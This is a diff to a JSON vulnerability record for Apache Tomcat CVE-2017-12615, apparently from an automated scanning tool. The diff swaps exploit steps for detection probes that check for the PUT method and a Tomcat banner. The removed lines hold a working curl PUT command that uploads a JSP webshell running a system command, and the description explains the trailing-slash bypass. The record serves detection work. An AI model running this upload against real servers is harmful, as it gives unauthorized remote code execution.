@@ -1,5 +1,6 @@
 {
   "vuln_id": "tomcat_cve2017_12615",
+  "dispatch_skill": "tomcat_exploit",
   "description": "Apache Tomcat 8.5.19 版本中，由于web.xml配置readonly=false，允许通过PUT方法上传文件，结合路径后缀绕过（如添加/）可上传JSP webshell，导致远程代码执行。",
   "category": "file_upload",
   "cves": [
@@ -26,20 +27,41 @@
     "/test.txt"
   ],
   "detection_method": "发送PUT请求到目标URL（如 http://{TARGET}/test.txt），如果返回HTTP状态码201 Created，说明PUT方法可用，可能存在漏洞。",
-  "exploit_steps": [
+  "probes": [
     {
-      "step": 1,
-      "description": "上传JSP webshell，通过在路径后添加/绕过后缀检测。",
-      "command": "curl -X PUT \"http://{TARGET}/shell.jsp/\" -d '<%out.println(new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next());%>'",
-      "expected_result": "返回HTTP状态码201 Created，表示文件上传成功。",
-      "notes": "使用/绕过Tomcat对.jsp后缀的检测，确保路径以/结尾。"
+      "id": "tomcat_put_probe",
+      "description": "OPTIONS / 检查是否允许 PUT 方法",
+      "method": "OPTIONS",
+      "path": "/",
+      "timeout": 8,
+      "success_signs": {
+        "header_contains": [
+          [
+            "Allow",
+            "PUT"
+          ]
+        ]
+      },
+      "confidence": 0.9
     },
     {
-      "step": 2,
-      "description": "访问上传的webshell以执行命令。",
-      "command": "curl \"http://{TARGET}/shell.jsp\"",
-      "expected_result": "返回命令执行结果，如uid=...，表示远程代码执行成功。",
-      "notes": "访问时去掉路径末尾的/，直接请求.jsp文件。"
+      "id": "tomcat_banner_probe",
+      "description": "GET / 检查 Tomcat banner",
+      "method": "GET",
+      "path": "/",
+      "timeout": 8,
+      "success_signs": {
+        "header_contains": [
+          [
+            "Server",
+            "Apache-Coyote"
+          ]
+        ],
+        "body_contains_any": [
+          "Apache Tomcat"
+        ]
+      },
+      "confidence": 0.5
     }
   ],
   "verification_command": "curl -X PUT \"http://{TARGET}/test.txt\" -d \"test content\"",
